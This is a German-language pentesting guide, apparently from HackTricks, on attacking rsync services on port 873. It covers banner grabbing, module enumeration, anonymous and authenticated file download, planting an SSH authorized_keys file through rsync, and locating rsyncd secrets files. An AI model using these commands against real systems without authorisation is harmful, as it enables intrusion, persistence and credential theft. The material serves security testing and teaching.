# 873 - Pentesting Rsync

{{#include ../banners/hacktricks-training.md}}

## **Grundinformationen**

Von [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** ist ein Dienstprogramm zum effizienten [Übertragen](https://en.wikipedia.org/wiki/File_transfer) und [Synchronisieren](https://en.wikipedia.org/wiki/File_synchronization) von [Dateien](https://en.wikipedia.org/wiki/Computer_file) zwischen einem Computer und einer externen Festplatte sowie über [vernetzte](https://en.wikipedia.org/wiki/Computer_network) [Computer](https://en.wikipedia.org/wiki/Computer) hinweg, indem die [Änderungszeiten](<https://en.wikipedia.org/wiki/Timestamping_(computing)>) und Größen der Dateien verglichen werden.[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) Es ist häufig auf [Unix-ähnlichen](https://en.wikipedia.org/wiki/Unix-like) [Betriebssystemen](https://en.wikipedia.org/wiki/Operating_system) zu finden. Der rsync-Algorithmus ist eine Art von [Delta-Codierung](https://en.wikipedia.org/wiki/Delta_encoding) und wird verwendet, um die Netzwerknutzung zu minimieren. [Zlib](https://en.wikipedia.org/wiki/Zlib) kann für zusätzliche [Datenkompression](https://en.wikipedia.org/wiki/Data_compression) verwendet werden,[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite_note-man_page-3) und [SSH](https://en.wikipedia.org/wiki/Secure_Shell) oder [stunnel](https://en.wikipedia.org/wiki/Stunnel) können für die Sicherheit verwendet werden.

**Standardport:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## Aufzählung

### Banner & Manuelle Kommunikation
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **Auflisten von Freigaben**

**Rsync-Module** werden als **Verzeichnisfreigaben** erkannt, die möglicherweise **mit Passwörtern geschützt** sind. Um verfügbare Module zu identifizieren und zu überprüfen, ob sie Passwörter erfordern, werden die folgenden Befehle verwendet:
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
Seien Sie sich bewusst, dass einige Freigaben möglicherweise nicht in der Liste erscheinen, was sie möglicherweise verbirgt. Darüber hinaus kann der Zugriff auf einige Freigaben auf bestimmte **Anmeldeinformationen** beschränkt sein, was durch eine **"Zugriff verweigert"**-Meldung angezeigt wird.

### [**Brute Force**](../generic-hacking/brute-force.md#rsync)

### Manuelle Rsync-Nutzung

Nach dem Erhalt einer **Modulübersicht** hängen die Aktionen davon ab, ob eine Authentifizierung erforderlich ist. Ohne Authentifizierung erfolgt das **Auflisten** und **Kopieren** von Dateien aus einem freigegebenen Ordner in ein lokales Verzeichnis durch:
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
Dieser Prozess **überträgt Dateien rekursiv** und bewahrt deren Attribute und Berechtigungen.

Mit **Anmeldeinformationen** kann das Auflisten und Herunterladen aus einem freigegebenen Ordner wie folgt erfolgen, wobei eine Passwortaufforderung erscheint:
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
Um **Inhalte hochzuladen**, wie z.B. eine _**authorized_keys**_-Datei für den Zugriff, verwenden Sie:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

Um die rsyncd-Konfigurationsdatei zu finden, führen Sie aus:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
Innerhalb dieser Datei könnte ein _secrets file_ Parameter auf eine Datei verweisen, die **Benutzernamen und Passwörter** für die rsyncd-Authentifizierung enthält.

## Referenzen

- [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

{{#include ../banners/hacktricks-training.md}}
